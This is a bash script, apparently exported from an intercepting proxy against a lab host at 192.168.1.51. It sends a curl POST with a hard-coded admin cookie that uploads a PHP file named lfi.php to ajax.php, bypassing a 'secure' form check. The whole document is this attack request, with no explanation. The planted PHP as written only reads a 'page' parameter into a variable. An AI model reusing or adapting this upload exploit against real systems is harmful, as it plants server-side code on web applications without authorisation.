#!/bin/bash -x

curl -i -s -k -X $'POST' \
    -H $'Host: 192.168.1.51' -H $'Content-Length: 217' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqgBndvJAUSgMRTNQ' -H $'Accept: */*' -H $'Origin: http://192.168.1.51' -H $'Referer: http://192.168.1.51/dashboard.html' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
    -b $'admin=%26G6u%40B6uDXMq%26MsR' \
    --data-binary $'------WebKitFormBoundaryqgBndvJAUSgMRTNQ\x0d\x0aContent-Disposition: form-data; name=\"secure\"\x0d\x0a\x0d\x0aval1d------WebKitFormBoundaryqgBndvJAUSgMRTNQ\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"lfi.php\"\x0d\x0aContent-Type: application/x-php\x0d\x0a\x0d\x0a<?php $file=$_GET[page];?>\x0d\x0a\x0d\x0a------WebKitFormBoundaryqgBndvJAUSgMRTNQ--\x0d\x0a' \
    $'http://192.168.1.51/ajax.php'
    
